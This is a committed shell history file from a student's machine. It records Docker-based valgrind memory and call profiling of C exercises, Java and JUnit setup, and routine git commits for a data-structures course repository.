+&& valgrind --tool=massif -v src/app && ms_print massif.out.14"
+: 1548294827:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif -v src/app && valgrind --tool=massif ms_print massif.out.14"
+: 1548295063:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif src/app && valgrind --tool=massif ms_print massif.out.14"
+: 1548295255:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif src/app"
+: 1548295287:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif src/app && ms_print massif.out.14"
+: 1548295298:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif src/app && ms_print massif.out.13"
+: 1548295324:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif src/app"
+: 1548295375:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; ms_print massif.out.14"
+: 1548295583:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif --stacks=yes src/app"
+: 1548295600:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; ms_print massif.out.13"
+: 1548295709:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif --stacks=yes --massif-out-file=massif_app src/app"
+: 1548295723:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; ms_print massif_app"
+: 1548295797:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif --stacks=yes --massif-out-file=massif_app src/app && ms_print massif_app"
+: 1548297305:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind -v src/app \\
+&& valgrind callgrind_annotate --tree=both --auto=yes"
+: 1548297330:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind -v src/app \\
+&& callgrind_annotate --tree=both --auto=yes"
+: 1548297364:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind -v src/app \\
+&& valgrind callgrind_annotate --tree=both --auto=yes"
+: 1548297573:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind --callgrind_app -v src/app \\
+&& callgrind_annotate --tree=both --auto=yes"
+: 1548297604:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind --callgrind-out-file=callgrind_app -v src/app \\
+&& callgrind_annotate --tree=both --auto=yes"
+: 1548297659:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind --callgrind-out-file=callgrind_app -v src/app \\
+&& callgrind_annotate --tree=both --auto=yes callgrind_app"
+: 1548297697:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind --callgrind-out-file=callgrind_app -v src/app \\
+&& valgrind callgrind_annotate --tree=both --auto=yes"
+: 1548297725:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind --callgrind-out-file=callgrind_app -v src/app \\
+&& valgrind callgrind_annotate --tree=both --auto=yes callgrind_app"
+: 1548297830:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind --callgrind-out-file=profiling/callgrind_app -v src/app \\
+&& valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_app"
+: 1548298017:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; && valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_app"
+: 1548298029:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_app"
+: 1548298055:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind --callgrind-out-file=profiling/callgrind_app -v src/app; valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_app"
+: 1548298098:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=callgrind --callgrind-out-file=profiling/callgrind_app -v src/app; \\
+valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_app"
+: 1548298162:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif --stacks=yes --massif-out-file=profiling/massif_app src/app \\
+&& ms_print profiling/massif_app"
+: 1548298178:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g \\
+&& valgrind --tool=massif --stacks=yes --massif-out-file=profiling/massif_app src/app; \\
+ms_print profiling/massif_app"
+: 1548298286:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g; \\
+valgrind --tool=callgrind --callgrind-out-file=profiling/callgrind_app -v src/app; \\
+valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_app"
+: 1548298318:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g; \\
+valgrind --tool=massif --stacks=yes --massif-out-file=profiling/massif_app src/app; \\
+ms_print profiling/massif_app"
+: 1548298348:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g; \\
+valgrind --tool=callgrind --callgrind-out-file=profiling/callgrind_app -v src/app; \\
+valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_app"
+: 1548298497:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v; \\
+valgrind--tool=callgrind --callgrind-out-file=profiling/callgrind_functions_test -v tests/functions_test; \\
+valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_functions_test"
+: 1548298539:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o src/app src/app.c src/functions.c -g; \\
+valgrind --tool=callgrind --callgrind-out-file=profiling/callgrind_app -v src/app; \\
+valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_app"
+: 1548298564:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v; \\
+valgrind--tool=callgrind --callgrind-out-file=profiling/callgrind_functions_test -v tests/functions_test; \ valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_functions_test"
+: 1548298588:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v"
+: 1548298630:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v; \\
+valgrind --tool=callgrind --callgrind-out-file=profiling/callgrind_functions_test -v tests/functions_test; \\
+valgrind callgrind_annotate --tree=both --auto=yes profiling/callgrind_functions_test"
+: 1548298719:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v; \\
+valgrind --tool=massif --stacks=yes --massif-out-file=profiling/massif_functions_test src/functions_test; \\
+ms_print profiling/massif_functions_test"
+: 1548298791:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v; \\
+valgrind --tool=massif --stacks=yes --massif-out-file=profiling/massif_functions_test tests/functions_test; \\
+ms_print profiling/massif_functions_test"
+: 1548299034:0;git add .
+: 1548299062:0;git commit -m "Heap and call profiling added."
+: 1548299066:0;git push
+: 1548299137:0;git pull
+: 1548299154:0;git push
+: 1548299301:0;git add .
+: 1548299314:0;git commit -m "Git ignore added."
+: 1548299317:0;git push
+: 1548299376:0;cd ..
+: 1548299378:0;git add .
+: 1548299382:0;git commit
+: 1548299394:0;git commit -m "Git ignore moved."
+: 1548299399:0;git push
+: 1548299606:0;git add .
+: 1548299622:0;git commit -m "Compiled code removed and gitignored."
+: 1548299627:0;git push
+: 1548302279:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v;\\
+valgrind --tool=massif --stacks=yes --massif-out-file=profiling/massif_functions_test tests/functions_test; \\
+ms_print profiling/massif_functions_test"
+: 1548302288:0;cd exercise\ 1
+: 1548302290:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v;\\
+valgrind --tool=massif --stacks=yes --massif-out-file=profiling/massif_functions_test tests/functions_test; \\
+ms_print profiling/massif_functions_test"
+: 1548302343:0;cd ..
+: 1548302351:0;cd cd exercise\ 1; echo "ha"
+: 1548302368:0;cd ..
+: 1548302371:0;cd cd exercise\ 1; echo "ha"
+: 1548302377:0;cd exercise\ 1; echo "ha"
+: 1548302507:0;cd ..
+: 1548302528:0;cd exercise\ 1/src && cc -std=c99 -o app app.c functions.c && ./app
+: 1548302683:0;cd .. & cd tests && gcc -std=c99 -o functions_test functions_test.c -lcunit -v && ./functions_test
+: 1548302694:0;cd .. && cd tests && gcc -std=c99 -o functions_test functions_test.c -lcunit -v && ./functions_test
+: 1548302905:0;cd .. && cd src
+: 1548303042:0;cd .. && cd tests
+: 1548303046:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v"
+: 1548303052:0;cd ..
+: 1548303055:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -g -lcunit -v"
+: 1548303114:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v"
+: 1548303187:0;docker run -ti -v $PWD:/test memory-test:0.1 bash -c \\
+"cd /test/; gcc -std=c99 -o tests/functions_test tests/functions_test.c -lcunit -v; tests/functions_test"
+: 1548303781:0;git pull
+: 1548303785:0;cd ..
+: 1548303786:0;git pull
+: 1548355886:0;cd "/Users/baroness/Documents/201901/6 Estructura de Datos - Boiton/data-structures"
+: 1548355892:0;git add .
+: 1548355953:0;git pull
+: 1548356005:0;git add .
+: 1548356017:0;git commit -m "Exercise 2 added."
+: 1548356019:0;git push
+: 1548651353:0;cd "/Users/baroness/Documents/201901/6 Estructura de Datos - Boiton/data-structures"
+: 1548651355:0;ls
+: 1548651359:0;cd exercise-2
+: 1548651365:0;git add .
+: 1548651407:0;git commit -m "Stack class updated."
+: 1548651413:0;git push
+: 1548651722:0;ls
+: 1548651733:0;cd ..
+: 1548651736:0;ls
+: 1548651740:0;git rm -r --cached .
+: 1548651751:0;git add .
+: 1548651761:0;git commit -m ".gitignore fix"
+: 1548651765:0;git push
+: 1548732622:0;ls
+: 1548732627:0;git add .
+: 1548732714:0;git commit -m "Testing environment created."
+: 1548732718:0;git push
+: 1548736007:0;ls
+: 1548736010:0;git add .
+: 1548736024:0;git commit -m "Stack testing updated."
+: 1548736027:0;git push
+: 1548736157:0;git add .
+: 1548736192:0;git commit -m "Fail messages added."
+: 1548736195:0;git push
+: 1548783951:0;ls
+: 1548783954:0;git add .
+: 1548784086:0;git commit -m "Dinamicy test added."
+: 1548784088:0;git push
+: 1548784535:0;git add .
+: 1548784581:0;git commit -m "More course requirements tests added."
+: 1548784583:0;git push
+: 1548788168:0;ls
+: 1548788171:0;git add .
+: 1548788196:0;git commit -m "Testing updated to run with JUnit 5."
+: 1548788202:0;git push
+: 1548806488:0;ls
+: 1548806491:0;java -cp <path-to-junit-folder>/junit.jar junit.runner.Version
+: 1548806511:0;java junit  junit.runner.Version
+: 1548806519:0;java junir version
+: 1548806528:0;java junit version
+: 1548806589:0;java import junit.runner.Version;
+: 1548824635:0;Contents/Resources/app/bin/macos/jprofiler.sh
+: 1548862638:0;cd "/Users/baroness/Documents/201901/6 Estructura de Datos - Boiton/data-structures"
+: 1548862641:0;git add .
+: 1548862655:0;git commit -m "Exercise 3 created."
+: 1548862657:0;git push
+: 1548863175:0;git pull
+: 1548896029:0;ls
+: 1548896043:0;git add .
+: 1548896049:0;git commit -m "Exercise 3 created."
+: 1548896052:0;git push
+: 1548896059:0;git pull
+: 1548896074:0;git push
+: 1548899540:0;git add .
+: 1548899581:0;git commit -m "Model method signatures added."
+: 1548899584:0;git push
+: 1548899656:0;git add .
+: 1548899661:0;git commit -m "Model method signatures added."
+: 1548899663:0;git push
+: 1548899717:0;git add .
+: 1548899719:0;git commit -m "Model method signatures added."
+: 1549159992:0;brew cleanup
+: 1549294828:0;cd ..
+: 1549294831:0;ls
+: 1549294838:0;cd 3\ DevOps\ -\ ﾃΦscar\ Garcﾃｭa
+: 1549294856:0;git clone https://fernandagonzalez0461@dev.azure.com/fernandagonzalez0461/Parts%20Unlimited/_git/PartsUnlimited
+: 1549390403:0;cd "/Users/baroness/Documents/201901/6 Estructura de Datos - Boiton/data-structures"
+: 1549390405:0;ls
+: 1549390432:0;git add .
+: 1549390445:0;git commit -m "Interface extracted."
+: 1549390448:0;git push
+: 1549390457:0;git pull
+: 1549390472:0;git push
+: 1549392433:0;git add .
+: 1549392801:0;git commit -m "Account methods updated."
+: 1549392804:0;git push
+: 1549417474:0;git add .
+: 1549417489:0;git commit -m "Unit testing updated."
+: 1549417492:0;git push
+: 1549432592:0;git add .
+: 1549432608:0;git commit -m "More testing scenarios added."
+: 1549638407:0;brew cask install intellij
+: 1549638500:0;brew cask install intellij-idea-ce
+: 1549640816:0;brew install maven
+: 1549641067:0;mvn
+: 1549858379:0;cd "/Users/baroness/Documents/201901/6 Estructura de Datos - Boiton/data-structures"
+: 1549858382:0;git add .
+: 1549858436:0;git commit -m "MVC and dependency inversion fully applied."
+: 1549858442:0;git push
+: 1549937349:0;git add .
+: 1549937374:0;git commit -m "Catalog class added."
+: 1549937381:0;git push
+: 1550017506:0;git add .
+: 1550017549:0;git commit -m "Bitcoin support removed and regex bug fixed."
+: 1550017552:0;git push
+: 1550022975:0;git add .
+: 1550022992:0;git commit -m "Unit tests updated."
+: 1550022994:0;git push
+: 1550102231:0;git add .
+: 1550102262:0;git commit -m "Bug hotfixing\
+
+: 1550102294:0;git commit -m "Bug hotfixing
+: 1550102312:0;git commit -m "Bug hotfixing lol..."
+: 1550102318:0;git push
+: 1550106091:0;git pull
+: 1550106355:0;git add .
+: 1550106369:0;git commit -m "Profiling snapshots added."
+: 1550106376:0;git push
+: 1550113762:0;git add .
+: 1550113779:0;git commit -m "Input bugs fixed."
+: 1550113782:0;git push
+: 1550113787:0;git pull
+: 1550113793:0;git push
+: 1550114552:0;git add .
+: 1550114564:0;git commit -m "New profiling snapshots."
+: 1550114567:0;git push
+: 1550114625:0;git pull
+: 1550116821:0;git add .
+: 1550116849:0;git commit -m "Alphabet frequencies updated."
+: 1550116851:0;git push
+: 1550122210:0;git add .
+: 1550122220:0;git commit -m "Unit testing."
+: 1550122221:0;git push
+: 1550122593:0;git add .
+: 1550122599:0;git commit -m "Unit testing done."
+: 1550122602:0;git push
+: 1550122657:0;git pull
+: 1550123415:0;git add .
+: 1550123425:0;git commit -m "Profiling done."
+: 1550123427:0;git push
+: 1550158170:0;git add
+: 1550158174:0;git add .
+: 1550158183:0;git commit -m "Profiling added."
+: 1550158185:0;git push
+: 1550158190:0;git pull
+: 1550158198:0;git push
+: 1550419629:0;ipconfig -a
+: 1550419646:0;ifconfig -a
+: 1550596276:0;cd "/Users/baroness/Documents/201901/6 Estructura de Datos - Boiton/data-structures"
+: 1550596279:0;git add .
+: 1550596311:0;git commit -m "MVP of exercise 7."
+: 1550596318:0;git push
+: 1550596322:0;git pull
+: 1550596330:0;git push
+: 1550596655:0;git add .
+: 1550596660:0;git commit -m "MVP of exercise 7."
+: 1550596663:0;git push
+: 1550802148:0;cd "/Users/baroness/Documents/201901/6 Estructura de Datos - Boiton/data-structures"
+: 1550802150:0;git add .
+: 1550802176:0;git commit -m "View and factory added."
+: 1550802184:0;git push
+: 1550812711:0;git add .
+: 1550812725:0;git commit -m "Main added."
+: 1550812728:0;git push
+: 1550814217:0;git add .
+: 1550814255:0;git commit -m "Full functionality finished."
+: 1550946956:0;cd "/Users/baroness/Documents/201901/6 Estructura de Datos - Boiton/data-structures"
+: 1550946959:0;git add .
+: 1550947224:0;git pull
